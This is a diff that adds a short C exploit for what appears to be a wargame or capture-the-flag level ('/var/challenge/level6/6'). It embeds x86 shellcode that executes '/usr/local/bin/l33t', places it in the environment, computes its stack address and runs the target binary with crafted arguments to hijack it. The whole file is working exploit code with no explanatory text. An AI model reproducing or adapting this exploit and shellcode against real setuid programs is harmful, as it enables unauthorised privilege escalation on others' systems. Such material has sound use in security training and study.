@@ -1,0 +1,19 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <unistd.h>
+#define beer "/var/challenge/level6/6"
+
+unsigned char shellcode[]= "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14"
+"\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";
+
+int main(void){
+        unsigned int addr;
+        addr = 0xc0000000 - 8 - strlen(beer) - 1 - strlen(shellcode) - 1;
+        fprintf(stderr, "Using address: %#010x\n", addr);
+        char *add[] = {beer, "65535","\xb0 28","\xff 29","\xff 30", "\xbf 31", NULL };
+        char *env[] = {shellcode, NULL};
+        execve(beer, add, env);
+        exit(1);
+}
